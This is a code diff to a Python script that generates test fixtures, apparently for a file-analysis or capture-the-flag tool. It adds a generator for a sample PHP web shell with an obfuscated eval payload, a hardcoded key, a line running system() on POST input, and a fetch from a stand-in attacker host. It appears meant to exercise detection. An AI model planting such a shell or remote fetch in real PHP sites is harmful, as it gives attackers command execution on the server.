@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import base64
 import binascii
+import codecs
 import hashlib
 import hmac
 import io
@@ -3263,6 +3264,34 @@ def lsb_wav(message: bytes, frames: int = 9000, rate: int = 8000) -> bytes:
     return buffer.getvalue()
 
 
+def php_webshell() -> str:
+    """A PHP web shell wrapped the way real ones are, with a flag in the payload.
+
+    base64 -> rot13 -> base64 -> raw deflate, then eval - plus the three things
+    Code Lens should name: a hardcoded key, $_POST input, and a system() call.
+    """
+    payload = b"<?php echo 'CYBN{php_crypter_payload}'; ?>"
+    inner = base64.b64encode(zlib.compress(payload, 9)[2:-4])  # raw deflate
+    rotated = codecs.encode(inner.decode(), "rot13")
+    blob = base64.b64encode(rotated.encode()).decode()
+    return (
+        "<?php\n"
+        "$k = 'Upd4t3r!';\n"
+        "$iv = '0123456789abcdef';\n"
+        f"$p = '{blob}';\n"
+        "eval(gzinflate(base64_decode(str_rot13(base64_decode($p)))));\n"
+        "if (isset($_POST['cmd'])) { system($_POST['cmd']); }\n"
+        "$data = file_get_contents('http://evil.example/beacon.txt');\n"
+        "$plain = openssl_decrypt($data, 'aes-256-cbc', md5($k, true), 0, $iv);\n"
+        "?>\n"
+    )
+
+
+def write_php_fixtures() -> None:
+    print("php:")
+    write("lens_webshell.php", php_webshell())
+
+
 def write_audio_fixtures() -> None:
     print("audio:")
     write("audio_lsb.wav", lsb_wav(b"CYBN{lsb_in_the_wav}\x00\x00"))
@@ -3477,6 +3506,7 @@ def main() -> None:
     write_exif_fixtures()
     write_mail_fixtures()
     write_audio_fixtures()
+    write_php_fixtures()
 
 
 if __name__ == "__main__":
